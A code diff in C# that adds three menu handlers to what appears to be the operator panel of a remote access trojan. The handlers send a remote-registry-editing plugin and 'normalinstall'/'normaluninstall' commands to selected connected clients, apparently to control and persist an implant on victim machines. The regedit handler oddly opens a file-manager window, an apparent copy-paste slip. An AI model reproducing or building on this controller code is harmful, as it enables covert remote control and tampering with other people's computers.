@@ -2175,5 +2175,91 @@ namespace Server
                 }
             }                
         }
+
+        private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Regedit.dll"));
+
+                foreach (Clients client in GetSelectedClients())
+                {
+                    FormFileManager fileManager = (FormFileManager)Application.OpenForms["remoteRegedit:" + client.ID];
+                    if (fileManager == null)
+                    {
+                        fileManager = new FormFileManager
+                        {
+                            Name = "remoteRegedit:" + client.ID,
+                            Text = "remoteRegedit:" + client.ID,
+                            F = this,
+                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
+                        };
+                        fileManager.Show();
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
+
+        private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "normalinstall";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
+                    {
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
+                }
+            }
+        }
+
+        private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Pac_ket").AsString = "normaluninstall";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
+                    {
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
+                }
+            }
+        }
     }
 }
